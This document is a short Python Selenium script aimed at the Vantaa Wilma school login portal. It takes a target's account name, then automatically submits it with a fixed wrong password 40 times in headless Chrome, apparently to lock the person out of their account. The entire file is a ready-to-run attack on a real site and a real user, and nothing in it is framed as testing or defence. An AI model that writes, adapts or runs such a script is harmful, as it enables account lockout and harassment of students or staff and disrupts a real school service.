from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options
from time import sleep
import argparse

options=Options()

options.add_argument("--headless=new")

parser = argparse.ArgumentParser("simple_example")
parser.add_argument("arg1", help="The wilma account of the target", type=str)
args = parser.parse_args()

email = str(args.arg1)
passw = "asdjhasd2"

web = webdriver.Chrome(options=options)

web.get('https://vantaa.inschool.fi')

sleep(1)

for i in range(40):
    osoite = web.find_element(By.ID, "login-frontdoor")
    osoite.send_keys(email)
    salakala = web.find_element(By.ID, "password")
    salakala.send_keys(passw + Keys.ENTER)
    print(i)
web.quit()


